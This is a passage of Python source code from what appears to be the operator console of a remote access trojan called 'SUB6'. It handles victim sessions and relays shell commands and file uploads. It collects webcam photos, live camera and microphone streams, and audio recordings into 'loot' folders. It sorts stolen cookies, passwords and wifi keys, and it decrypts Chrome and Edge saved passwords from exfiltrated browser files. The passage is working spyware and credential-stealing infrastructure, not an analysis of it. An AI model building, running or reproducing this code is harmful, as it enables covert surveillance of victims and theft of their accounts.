        let frameCount = 0;
        let lastTime = Date.now();
        
        function updateFrame() {
            const timestamp = Date.now();
            img.src = '/frame.jpg?t=' + timestamp;
        }
        
        img.onload = function() {
            frameCount++;
            resDisplay.textContent = img.naturalWidth + 'x' + img.naturalHeight;
            statusDot.style.background = '#4ecca3';
            statusText.textContent = 'Live';
            
            // Update FPS every second
            const now = Date.now();
            if (now - lastTime >= 1000) {
                fpsDisplay.textContent = frameCount;
                frameCount = 0;
                lastTime = now;
            }
            
            // Request next frame
            setTimeout(updateFrame, 100);  // 10 FPS max on client side
        };
        
        img.onerror = function() {
            statusDot.style.background = '#e94560';
            statusText.textContent = 'No Stream';
            setTimeout(updateFrame, 1000);  // Retry after 1 second
        };
        
        // Start
        updateFrame();
    </script>
</body>
</html>'''
                    self.wfile.write(html.encode())
                    
                elif self.path.startswith('/frame.jpg'):
                    # Serve latest frame
                    if session_id in server_instance.liveview_frames:
                        frame = server_instance.liveview_frames[session_id]
                        self.send_response(200)
                        self.send_header('Content-type', 'image/jpeg')
                        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                        self.send_header('Pragma', 'no-cache')
                        self.end_headers()
                        self.wfile.write(frame['data'])
                    else:
                        self.send_error(404, 'No frame available')
                else:
                    self.send_error(404, 'Not found')
        
        # Find available port
        for port in range(self.liveview_web_port, self.liveview_web_port + 100):
            try:
                with socketserver.TCPServer(('0.0.0.0', port), LiveViewHandler) as httpd:
                    self.liveview_web_port = port
                    httpd.serve_forever()
                    break
            except OSError:
                continue
    
    async def save_camshot(self, session_id, data):
        """Save webcam photo (handles base64 encoded data - RGB or JPEG)"""
        try:
            # Check for JPEG format first
            is_jpeg = b'<<<CAMSHOT_JPEG>>>' in data
            
            if is_jpeg:
                start = data.find(b'<<<CAMSHOT_JPEG>>>')
                header_offset = 18  # len('<<<CAMSHOT_JPEG>>>')
            else:
                start = data.find(b'<<<CAMSHOT_START>>>')
                header_offset = 19  # len('<<<CAMSHOT_START>>>')
            
            data_start = data.find(b'<<<DATA_START>>>')
            end = data.find(b'<<<CAMSHOT_END>>>')
            
            if start == -1 or data_start == -1 or end == -1:
                if self.active_session == session_id:
                    self.message_queue.put("[!] Invalid camshot format")
                return
            
            header = data[start+header_offset:data_start].decode('utf-8')
            parts = header.split('|')
            
            if len(parts) < 3:
                if self.active_session == session_id:
                    self.message_queue.put("[!] Invalid camshot header")
                return
            
            width = int(parts[0])
            height = int(parts[1])
            expected_size = int(parts[2])
            
            pixel_start = data_start + 16
            b64_data = data[pixel_start:end]
            
            # Clean base64 data
            import re
            b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
            
            try:
                pixel_data = base64.b64decode(b64_clean)
            except Exception as e:
                if self.active_session == session_id:
                    self.message_queue.put(f"[!] Base64 decode error: {e}")
                return
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"loot/webcam/session_{session_id}_{timestamp}"
            
            # Check if it's JPEG data (Linux/Android send JPEG files)
            if pixel_data[:2] == b'\xff\xd8':  # JPEG magic bytes
                filename += ".jpg"
                with open(filename, 'wb') as f:
                    f.write(pixel_data)
                if self.active_session == session_id:
                    self.message_queue.put(f"[+] Webcam photo saved: {filename}")
            # Check if it's PNG data
            elif pixel_data[:8] == b'\x89PNG\r\n\x1a\n':  # PNG magic bytes
                filename += ".png"
                with open(filename, 'wb') as f:
                    f.write(pixel_data)
                if self.active_session == session_id:
                    self.message_queue.put(f"[+] Webcam photo saved: {filename}")
            # Otherwise treat as raw RGB data (Windows)
            else:
                filename += ".png"
                stride = ((width * 3 + 3) & ~3)
                if len(pixel_data) >= width * height * 3:
                    image = Image.frombytes('RGB', (width, height), pixel_data[:width * height * 3])
                    image.save(filename)
                    if self.active_session == session_id:
                        self.message_queue.put(f"[+] Webcam photo saved: {filename}")
                else:
                    if self.active_session == session_id:
                        self.message_queue.put(f"[!] Incomplete camshot data ({len(pixel_data)} vs {width * height * 3})")
                
        except Exception as e:
            if self.active_session == session_id:
                self.message_queue.put(f"[!] Camshot error: {e}")
    
    async def save_audio(self, session_id, data):
        """Save audio recording (handles base64 encoded WAV data)"""
        try:
            start = data.find(b'<<<AUDIO_START>>>')
            data_start = data.find(b'<<<DATA_START>>>')
            end = data.find(b'<<<AUDIO_END>>>')
            
            if start == -1 or data_start == -1 or end == -1:
                if self.active_session == session_id:
                    self.message_queue.put("[!] Invalid audio format")
                return
            
            # Parse header: seconds|size
            header = data[start+17:data_start].decode('utf-8')
            parts = header.split('|')
            
            if len(parts) < 2:
                if self.active_session == session_id:
                    self.message_queue.put("[!] Invalid audio header")
                return
            
            duration = int(parts[0])
            expected_size = int(parts[1])
            
            # Extract base64 data
            b64_start = data_start + 16
            b64_data = data[b64_start:end]
            
            # Clean base64 data
            import re
            b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
            
            try:
                wav_data = base64.b64decode(b64_clean)
            except Exception as e:
                if self.active_session == session_id:
                    self.message_queue.put(f"[!] Audio base64 decode error: {e}")
                return
            
            # Save WAV file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"loot/audio/session_{session_id}_{timestamp}_{duration}s.wav"
            
            with open(filename, 'wb') as f:
                f.write(wav_data)
            
            if self.active_session == session_id:
                self.message_queue.put(f"[+] Audio recording saved: {filename} ({len(wav_data)} bytes, {duration}s)")
                
        except Exception as e:
            if self.active_session == session_id:
                self.message_queue.put(f"[!] Audio save error: {e}")
    
    async def handle_camview_frame(self, session_id, session, data):
        """Handle camera view frame data (RGB or JPEG)"""
        try:
            if not session.get('camview_mode'):
                session['camview_mode'] = True
                session['camview_data'] = b''
            
            session['camview_data'] += data
            
            if b'<<<FRAME_END>>>' in session['camview_data']:
                frame_data = session['camview_data']
                session['camview_mode'] = False
                session['camview_data'] = b''
                
                # Check if it's JPEG or RGB frame
                is_jpeg = b'<<<CAMVIEW_JPEG>>>' in frame_data
                
                if is_jpeg:
                    start = frame_data.find(b'<<<CAMVIEW_JPEG>>>')
                    header_len = 18
                else:
                    start = frame_data.find(b'<<<CAMVIEW_FRAME>>>')
                    header_len = 19
                
                data_start = frame_data.find(b'<<<FRAME_DATA>>>')
                end = frame_data.find(b'<<<FRAME_END>>>')
                
                if start == -1 or data_start == -1 or end == -1:
                    return
                
                header = frame_data[start+header_len:data_start].decode('utf-8')
                parts = header.split('|')
                
                if len(parts) < 3:
                    return
                
                width = int(parts[0])
                height = int(parts[1])
                expected_size = int(parts[2])
                
                # Extract base64 data
                b64_data = frame_data[data_start+16:end]
                
                # Clean base64
                import re
                b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
                
                try:
                    pixel_data = base64.b64decode(b64_clean)
                except:
                    return
                
                if is_jpeg:
                    # Already JPEG - use directly
                    jpeg_data = pixel_data
                else:
                    # Convert RGB to JPEG for web display
                    if len(pixel_data) >= width * height * 3:
                        image = Image.frombytes('RGB', (width, height), pixel_data[:width * height * 3])
                        
                        # Convert to JPEG
                        buffer = BytesIO()
                        image.save(buffer, format='JPEG', quality=70)
                        jpeg_data = buffer.getvalue()
                    else:
                        return
                
                # Store for web server
                self.camview_frames[session_id] = {
                    'data': jpeg_data,
                    'width': width,
                    'height': height,
                    'timestamp': datetime.now()
                }
        except Exception as e:
            pass
    
    async def start_camview_server(self, session_id):
        """Start the HTTP server for camera view"""
        if self.camview_server_thread and self.camview_server_thread.is_alive():
            pass
        else:
            self.camview_server_thread = threading.Thread(
                target=self.run_camview_webserver,
                args=(session_id,),
                daemon=True
            )
            self.camview_server_thread.start()
        
        local_ip = self.get_local_ip()
        
        GREEN = '\033[92m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        RESET = '\033[0m'
        
        print(f"\n{GREEN}[+]{RESET} Camera View started for session {CYAN}{session_id}{RESET}")
        print(f"{GREEN}[*]{RESET} Open browser to view webcam:")
        print(f"    {CYAN}http://localhost:{self.camview_web_port}{RESET}")
        print(f"    {CYAN}http://{local_ip}:{self.camview_web_port}{RESET}")
        print(f"{YELLOW}[*]{RESET} Use '{CYAN}stopcam{RESET}' in session to stop streaming")
        
        if self.active_session:
            print(self.session_prompt(self.active_session), end="", flush=True)
        else:
            print(self.server_prompt(), end="", flush=True)
    
    def run_camview_webserver(self, session_id):
        """Run HTTP server for camera view"""
        server_instance = self
        
        class CamViewHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                if self.path == '/' or self.path == '/index.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html = '''<!DOCTYPE html>
<html>
<head>
    <title>Camera View - Session ''' + str(session_id) + '''</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #1a1a2e; 
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .header {
            background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%);
            width: 100%;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #4ecca3;
        }
        .logo {
            color: #4ecca3;
            font-size: 24px;
            font-weight: bold;
        }
        .status {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #4ecca3;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .status-text {
            color: #4ecca3;
            font-size: 14px;
        }
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            width: 100%;
        }
        #camera {
            max-width: 95%;
            max-height: calc(100vh - 120px);
            border: 3px solid #4ecca3;
            border-radius: 8px;
            box-shadow: 0 0 30px rgba(78, 204, 163, 0.3);
        }
        .info {
            color: #888;
            padding: 10px;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">📷 SUB6 Camera View</div>
        <div class="status">
            <div class="status-dot" id="statusDot"></div>
            <span class="status-text" id="statusText">Connecting...</span>
        </div>
    </div>
    <div class="container">
        <img id="camera" alt="Webcam Feed" />
    </div>
    <div class="info">
        Session: ''' + str(session_id) + ''' | <span id="fps">0</span> FPS | <span id="resolution">-</span>
    </div>
    
    <script>
        const img = document.getElementById('camera');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        const fpsDisplay = document.getElementById('fps');
        const resDisplay = document.getElementById('resolution');
        
        let frameCount = 0;
        let lastTime = Date.now();
        
        function updateFrame() {
            const timestamp = Date.now();
            img.src = '/frame.jpg?t=' + timestamp;
        }
        
        img.onload = function() {
            frameCount++;
            resDisplay.textContent = img.naturalWidth + 'x' + img.naturalHeight;
            statusDot.style.background = '#4ecca3';
            statusText.textContent = 'Live';
            
            const now = Date.now();
            if (now - lastTime >= 1000) {
                fpsDisplay.textContent = frameCount;
                frameCount = 0;
                lastTime = now;
            }
            
            setTimeout(updateFrame, 100);
        };
        
        img.onerror = function() {
            statusDot.style.background = '#e94560';
            statusText.textContent = 'No Camera';
            setTimeout(updateFrame, 1000);
        };
        
        updateFrame();
    </script>
</body>
</html>'''
                    self.wfile.write(html.encode())
                    
                elif self.path.startswith('/frame.jpg'):
                    if session_id in server_instance.camview_frames:
                        frame = server_instance.camview_frames[session_id]
                        self.send_response(200)
                        self.send_header('Content-type', 'image/jpeg')
                        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                        self.send_header('Pragma', 'no-cache')
                        self.end_headers()
                        self.wfile.write(frame['data'])
                    else:
                        self.send_error(404, 'No frame available')
                else:
                    self.send_error(404, 'Not found')
        
        for port in range(self.camview_web_port, self.camview_web_port + 100):
            try:
                with socketserver.TCPServer(('0.0.0.0', port), CamViewHandler) as httpd:
                    self.camview_web_port = port
                    httpd.serve_forever()
                    break
            except OSError:
                continue
    
    async def handle_audio_chunk(self, session_id, session, data):
        """Handle live audio chunk data"""
        try:
            if not session.get('audiochunk_mode'):
                session['audiochunk_mode'] = True
                session['audiochunk_data'] = b''
            
            session['audiochunk_data'] += data
            
            if b'<<<CHUNK_END>>>' in session['audiochunk_data']:
                chunk_data = session['audiochunk_data']
                session['audiochunk_mode'] = False
                session['audiochunk_data'] = b''
                
                # Parse chunk
                start = chunk_data.find(b'<<<AUDIO_CHUNK>>>')
                data_start = chunk_data.find(b'<<<DATA>>>')
                end = chunk_data.find(b'<<<CHUNK_END>>>')
                
                if start == -1 or data_start == -1 or end == -1:
                    return
                
                # Extract base64 data
                b64_data = chunk_data[data_start+10:end]
                
                import re
                b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
                
                try:
                    audio_data = base64.b64decode(b64_clean)
                except:
                    return
                
                # Store for web playback
                if session_id not in self.liveaudio_chunks:
                    self.liveaudio_chunks[session_id] = []
                
                self.liveaudio_chunks[session_id].append(audio_data)
                
                # Keep only last 50 chunks (~5 seconds at 22kHz)
                if len(self.liveaudio_chunks[session_id]) > 50:
                    self.liveaudio_chunks[session_id] = self.liveaudio_chunks[session_id][-50:]
        except Exception as e:
            pass
    
    async def start_liveaudio_server(self, session_id):
        """Start the HTTP server for live audio"""
        if self.liveaudio_server_thread and self.liveaudio_server_thread.is_alive():
            pass
        else:
            self.liveaudio_server_thread = threading.Thread(
                target=self.run_liveaudio_webserver,
                args=(session_id,),
                daemon=True
            )
            self.liveaudio_server_thread.start()
        
        local_ip = self.get_local_ip()
        
        GREEN = '\033[92m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        RESET = '\033[0m'
        
        print(f"\n{GREEN}[+]{RESET} Live Audio started for session {CYAN}{session_id}{RESET}")
        print(f"{GREEN}[*]{RESET} Open browser to listen:")
        print(f"    {CYAN}http://localhost:{self.liveaudio_web_port}{RESET}")
        print(f"    {CYAN}http://{local_ip}:{self.liveaudio_web_port}{RESET}")
        print(f"{YELLOW}[*]{RESET} Use '{CYAN}stopaudio{RESET}' in session to stop streaming")
        
        if self.active_session:
            print(self.session_prompt(self.active_session), end="", flush=True)
        else:
            print(self.server_prompt(), end="", flush=True)
    
    def run_liveaudio_webserver(self, session_id):
        """Run HTTP server for live audio"""
        server_instance = self
        
        class LiveAudioHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                if self.path == '/' or self.path == '/index.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html = '''<!DOCTYPE html>
<html>
<head>
    <title>Live Audio - Session ''' + str(session_id) + '''</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #1a1a2e; 
            font-family: 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .header {
            background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%);
            width: 100%;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #f39c12;
        }
        .logo {
            color: #f39c12;
            font-size: 24px;
            font-weight: bold;
        }
        .status {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #4ecca3;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .status-text {
            color: #4ecca3;
            font-size: 14px;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
            width: 100%;
        }
        .audio-visual {
            width: 300px;
            height: 300px;
            border-radius: 50%;
            border: 5px solid #f39c12;
            display: flex;
            justify-content: center;
            align-items: center;
            animation: glow 2s infinite;
        }
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 20px rgba(243, 156, 18, 0.3); }
            50% { box-shadow: 0 0 60px rgba(243, 156, 18, 0.6); }
        }
        .mic-icon {
            font-size: 100px;
        }
        .info {
            color: #888;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .note {
            color: #f39c12;
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #f39c12;
            border-radius: 8px;
        }
        .audio-controls {
            margin-top: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }
        .controls-label {
            color: #fff;
            font-size: 14px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🎤 SUB6 Live Audio</div>
        <div class="status">
            <div class="status-dot" id="statusDot"></div>
            <span class="status-text" id="statusText">Streaming...</span>
        </div>
    </div>
    <div class="container">
        <div class="audio-visual">
            <span class="mic-icon">🎙️</span>
        </div>
        <div class="info">
            Session: ''' + str(session_id) + ''' | Sample Rate: ''' + str(server_instance.liveaudio_samplerate) + ''' Hz
        </div>
        <div class="audio-controls">
            <div class="controls-label">Live Audio Stream</div>
            <audio id="audioPlayer" controls style="width: 300px; height: 40px;">
                <source src="/audio.wav" type="audio/wav">
                Your browser does not support the audio element.
            </audio>
        </div>
        <div class="note">
            <p>🎧 Live audio streaming active</p>
            <p>Click play to listen to the microphone feed in real-time.</p>
            <p>Audio updates automatically as new data arrives.</p>
        </div>
    </div>
    
    <script>
        const player = document.getElementById('audioPlayer');
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        let lastAudioUrl = '/audio.wav?t=0';
        let updateInterval = 500; // Update every 500ms
        
        // Auto-reload audio source for live streaming
        function updateAudioStream() {
            if (player.paused) {
                // If paused, refresh source anyway for when user plays
                player.src = '/audio.wav?t=' + Date.now();
            } else {
                // If playing, reload to get new chunks
                const currentTime = player.currentTime;
                player.src = '/audio.wav?t=' + Date.now();
                player.currentTime = Math.max(0, currentTime - 0.5); // Keep slight buffer
                player.play().catch(e => {
                    console.log('Play interrupted for stream update');
                });
            }
        }
        
        // Update audio stream regularly
        setInterval(updateAudioStream, updateInterval);
        
        // Try to autoplay
        setTimeout(() => {
            player.play().catch(e => {
                console.log('Autoplay prevented by browser');
            });
        }, 1000);
        
        player.addEventListener('play', () => {
            statusDot.style.background = '#4ecca3';
            statusText.textContent = 'Playing';
        });
        
        player.addEventListener('pause', () => {
            statusDot.style.background = '#f39c12';
            statusText.textContent = 'Paused';
        });
    </script>
</body>
</html>'''
                    self.wfile.write(html.encode())
                    
                elif self.path.startswith('/audio.wav'):
                    # Return accumulated audio as WAV
                    if session_id in server_instance.liveaudio_chunks and server_instance.liveaudio_chunks[session_id]:
                        chunks = server_instance.liveaudio_chunks[session_id]
                        audio_data = b''.join(chunks)
                        
                        # Create WAV header
                        sample_rate = server_instance.liveaudio_samplerate
                        channels = server_instance.liveaudio_channels
                        bits_per_sample = 16
                        data_size = len(audio_data)
                        
                        wav_header = b'RIFF'
                        wav_header += (data_size + 36).to_bytes(4, 'little')
                        wav_header += b'WAVE'
                        wav_header += b'fmt '
                        wav_header += (16).to_bytes(4, 'little')
                        wav_header += (1).to_bytes(2, 'little')
                        wav_header += channels.to_bytes(2, 'little')
                        wav_header += sample_rate.to_bytes(4, 'little')
                        wav_header += (sample_rate * channels * bits_per_sample // 8).to_bytes(4, 'little')
                        wav_header += (channels * bits_per_sample // 8).to_bytes(2, 'little')
                        wav_header += bits_per_sample.to_bytes(2, 'little')
                        wav_header += b'data'
                        wav_header += data_size.to_bytes(4, 'little')
                        
                        self.send_response(200)
                        self.send_header('Content-type', 'audio/wav')
                        self.send_header('Content-Length', str(len(wav_header) + data_size))
                        self.end_headers()
                        self.wfile.write(wav_header + audio_data)
                    else:
                        self.send_error(404, 'No audio available')
                else:
                    self.send_error(404, 'Not found')
        
        for port in range(self.liveaudio_web_port, self.liveaudio_web_port + 100):
            try:
                with socketserver.TCPServer(('0.0.0.0', port), LiveAudioHandler) as httpd:
                    self.liveaudio_web_port = port
                    httpd.serve_forever()
                    break
            except OSError:
                continue

    async def save_file(self, session_id, data):
        """Save downloaded file (handles base64 encoded data)"""
        try:
            start = data.find(b'<<<FILE_START>>>')
            name_end = data.find(b'<<<NAME_END>>>')
            end = data.find(b'<<<FILE_END>>>')
            
            if start == -1 or end == -1:
                return
            
            filename = "download"
            expected_size = 0
            
            if name_end != -1:
                header = data[start+16:name_end].decode('utf-8', errors='replace').strip()
                # Check if header contains size (format: filename|size)
                if '|' in header:
                    parts = header.split('|')
                    filename = parts[0]
                    try:
                        expected_size = int(parts[1])
                    except:
                        expected_size = 0
                else:
                    filename = header
                b64_data = data[name_end+14:end]
            else:
                b64_data = data[start+16:end]
            
            # Clean base64 data - remove any non-base64 characters
            # Valid base64: A-Z, a-z, 0-9, +, /, =
            import re
            b64_clean = re.sub(rb'[^A-Za-z0-9+/=]', b'', b64_data)
            
            # Decode base64
            try:
                file_data = base64.b64decode(b64_clean)
            except Exception as e:
                if self.active_session == session_id:
                    print(f"\n[!] Base64 decode error: {e}")
                    print(self.session_prompt(session_id), end="", flush=True)
                return
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_filename = "".join(c for c in filename if c.isalnum() or c in "._- ")
            if not safe_filename:
                safe_filename = "download"
            
            # Route files to appropriate loot folders based on filename
            filename_lower = filename.lower()
            
            # Cookie files - go to loot/cookies/
            if 'cookie' in filename_lower or filename_lower.endswith('_cookies.txt'):
                os.makedirs("loot/cookies", exist_ok=True)
                clean_name = safe_filename
                save_path = f"loot/cookies/{clean_name}"
                if os.path.exists(save_path):
                    save_path = f"loot/cookies/s{session_id}_{clean_name}"
            elif 'password' in filename_lower or '_decrypted' in filename_lower or 'login_data' in filename_lower:
                # Password files go to loot/passwords/
                os.makedirs("loot/passwords", exist_ok=True)
                save_path = f"loot/passwords/{safe_filename}"
                if os.path.exists(save_path):
                    save_path = f"loot/passwords/s{session_id}_{safe_filename}"
            elif 'wifi' in filename_lower:
                # WiFi passwords go to loot/passwords/
                os.makedirs("loot/passwords", exist_ok=True)
                save_path = f"loot/passwords/{safe_filename}"
                if os.path.exists(save_path):
                    save_path = f"loot/passwords/s{session_id}_{safe_filename}"
            else:
                # Everything else goes to loot/downloads/
                os.makedirs("loot/downloads", exist_ok=True)
                save_path = f"loot/downloads/session_{session_id}_{timestamp}_{safe_filename}"
            
            with open(save_path, 'wb') as f:
                f.write(file_data)
            
            if self.active_session == session_id:
                self.message_queue.put(f"[+] File saved: {save_path} ({len(file_data)} bytes)")
            
            # Track browser credential files for server-side decryption
            filename_lower = filename.lower()
            if session_id not in self.browser_cred_files:
                self.browser_cred_files[session_id] = {}
            
            if 'chrome_login' in filename_lower or filename_lower == 'login data':
                self.browser_cred_files[session_id]['chrome_login'] = save_path
            elif 'chrome_localstate' in filename_lower or 'chrome_state' in filename_lower or filename_lower == 'local state':
                self.browser_cred_files[session_id]['chrome_state'] = save_path
            elif 'edge_login' in filename_lower:
                self.browser_cred_files[session_id]['edge_login'] = save_path
            elif 'edge_localstate' in filename_lower or 'edge_state' in filename_lower:
                self.browser_cred_files[session_id]['edge_state'] = save_path
            
            # Try to decrypt if we have both login db and local state for a browser
            await self.try_decrypt_browser_passwords(session_id)
            
        except Exception as e:
            if self.active_session == session_id:
                self.message_queue.put(f"[!] File save error: {e}")
    
    async def try_decrypt_browser_passwords(self, session_id):
        """Try to decrypt browser passwords if we have both required files"""
        if session_id not in self.browser_cred_files:
            return
        
        creds = self.browser_cred_files[session_id]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Try Chrome
        if 'chrome_login' in creds and 'chrome_state' in creds:
            login_path = creds['chrome_login']
            state_path = creds['chrome_state']
            output_path = f"loot/passwords/session_{session_id}_{timestamp}_chrome_passwords.txt"
            
            if os.path.exists(login_path) and os.path.exists(state_path):
                success, msg = decrypt_browser_database(login_path, state_path, output_path)
                if success:
                    if self.active_session == session_id:
                        self.message_queue.put(f"{Colors.GREEN}[+] Chrome passwords decrypted: {output_path}{Colors.RESET}")
                        self.message_queue.put(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
                    # Clear so we don't re-decrypt
                    del creds['chrome_login']
                    del creds['chrome_state']
                else:
                    if self.active_session == session_id:
                        self.message_queue.put(f"{Colors.YELLOW}[!] Chrome decrypt failed: {msg}{Colors.RESET}")
        
        # Try Edge
        if 'edge_login' in creds and 'edge_state' in creds:
            login_path = creds['edge_login']
            state_path = creds['edge_state']
            output_path = f"loot/passwords/session_{session_id}_{timestamp}_edge_passwords.txt"
            
            if os.path.exists(login_path) and os.path.exists(state_path):
                success, msg = decrypt_browser_database(login_path, state_path, output_path)
                if success:
                    if self.active_session == session_id:
                        self.message_queue.put(f"{Colors.GREEN}[+] Edge passwords decrypted: {output_path}{Colors.RESET}")
                        self.message_queue.put(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
                    del creds['edge_login']
                    del creds['edge_state']
                else:
                    if self.active_session == session_id:
                        self.message_queue.put(f"{Colors.YELLOW}[!] Edge decrypt failed: {msg}{Colors.RESET}")

    async def send_command(self, session_id, command):
        """Send command to session"""
        if session_id not in self.sessions:
            print(f"[!] Session {session_id} not found")
            return False
        
        websocket = self.sessions[session_id]['websocket']
        
        try:
            cmd = command.strip() + '\n'
            await websocket.send(cmd.encode('utf-8'))
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False
    
    async def upload_file(self, session_id, filepath):
        """Upload file to client with chunked transfer"""
        if session_id not in self.sessions:
            print(f"[!] Session {session_id} not found")
            return
        
        if not os.path.exists(filepath):
            print(f"[!] File not found: {filepath}")
            return
        
        try:
            filename = os.path.basename(filepath)
            file_size = os.path.getsize(filepath)
            
            websocket = self.sessions[session_id]['websocket']
            
            print(f"[*] Uploading: {filename} ({file_size} bytes)")
            
            # Read entire file and encode as base64 for reliable transfer
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            import base64
            b64_data = base64.b64encode(file_data).decode('ascii')
            
            # Send as single message with header containing size
            upload_msg = f"<<<UPLOAD_START>>>{filename}|{file_size}<<<NAME_END>>>{b64_data}<<<UPLOAD_END>>>"
            await websocket.send(upload_msg.encode('utf-8'))
            
            print(f"[+] File uploaded: {filename} ({file_size} bytes)")
            print(self.session_prompt(session_id), end="", flush=True)
            
        except Exception as e:
            print(f"[!] Upload error: {e}")
            print(self.session_prompt(session_id), end="", flush=True)
    
    async def interact(self, session_id):
        """Interactive session with proper notification handling"""
        if session_id not in self.sessions:
            print(f"[!] Session {session_id} not found")
            return
        
        self.active_session = session_id
        
        print(f"\n[*] Interacting with session {session_id}")
        print("[*] Type 'background' to return to server prompt")
        print("[*] Type 'help' for commands\n")
        
        try:
            while self.running:
                # Check if session still exists
                if session_id not in self.sessions:
                    print("\n[!] Session closed - returning to server prompt")
                    break
                
                try:
                    # Get appropriate prompt
                    if self.in_shell_mode and self.last_client_prompt:
                        prompt = self.last_client_prompt
                    else:
                        prompt = self.session_prompt(session_id)
                    
                    # Use prompt_toolkit async prompt
                    cmd = await self.prompt_session.prompt_async(prompt)
                    
                    # Double-check session still valid
                    if session_id not in self.sessions:
                        print("\n[!] Session no longer exists")
                        break
                    
                    cmd = cmd.strip()
                    
                    if cmd.lower() in ['background', 'back', 'bg']:
                        print(f"\n[*] Backgrounding session {session_id}\n")
                        self.in_shell_mode = False
                        self.last_client_prompt = ''
                        break
                    
                    if cmd == '':
                        continue
                    
                    # Handle local commands
                    if cmd.startswith('upload '):
                        filepath = cmd[7:].strip()
                        await self.upload_file(session_id, filepath)
                        continue
                    
                    if cmd in ['clear', 'cls']:
                        self.clear_screen()
                        if self.in_shell_mode and self.last_client_prompt:
                            print(f"[*] Shell session active")
                        else:
                            print(f"[*] Session {session_id} active")
                        continue
                    
                    if cmd == 'help':
                        self.print_session_help(session_id)
                        continue
                    
                    # Track shell mode
                    if cmd == 'shell':
                        self.in_shell_mode = True
                        self.last_client_prompt = ''
                    elif cmd == 'exit' and self.in_shell_mode:
                        self.in_shell_mode = False
                        self.last_client_prompt = ''
                    
                    # Send command to client
                    if not await self.send_command(session_id, cmd):
                        print(f"\n[!] Failed to send command")
                        break
                    
                    # Wait for response
                    await asyncio.sleep(0.3)
                    
                except KeyboardInterrupt:
                    print(f"\n\n[*] Backgrounding session {session_id}\n")
                    break
        finally:
            self.active_session = None
            self.in_shell_mode = False
            self.last_client_prompt = ''
    
    def list_sessions(self):
        """List active sessions"""
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        YELLOW = '\033[93m'
        WHITE = '\033[97m'
        MAGENTA = '\033[95m'
        BOLD = '\033[1m'
        RESET = '\033[0m'
        
        if not self.sessions:
            print(f"\n{YELLOW}[!]{RESET} No active sessions\n")
            return
        
        print(f"\n{YELLOW}╔═══════════════════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{YELLOW}║{RESET}                           {CYAN}{BOLD}ACTIVE SESSIONS {RESET}                                    {YELLOW}║{RESET}")
        print(f"{YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣{RESET}")
        print(f"{YELLOW}║{RESET}  {WHITE}ID{RESET}   {WHITE}OS{RESET}       {WHITE}Computer{RESET}              {WHITE}User{RESET}            {WHITE}Connected{RESET}   {WHITE}Status{RESET}       {YELLOW}║{RESET}")
        print(f"{YELLOW}╠═══════════════════════════════════════════════════════════════════════════════╣{RESET}")
        
        for sid, info in self.sessions.items():
            duration = datetime.now() - info['start_time']
            mins = int(duration.total_seconds() // 60)
            secs = int(duration.total_seconds() % 60)
            status = f"{GREEN}● ACTIVE{RESET}" if sid == self.active_session else f"{CYAN}○ IDLE{RESET}  "
            comp = info.get('computer', 'Unknown')[:14]
            user = info.get('user', 'Unknown')[:13]
            time_str = f"{mins}m {secs}s"
            
            # OS type with color coding
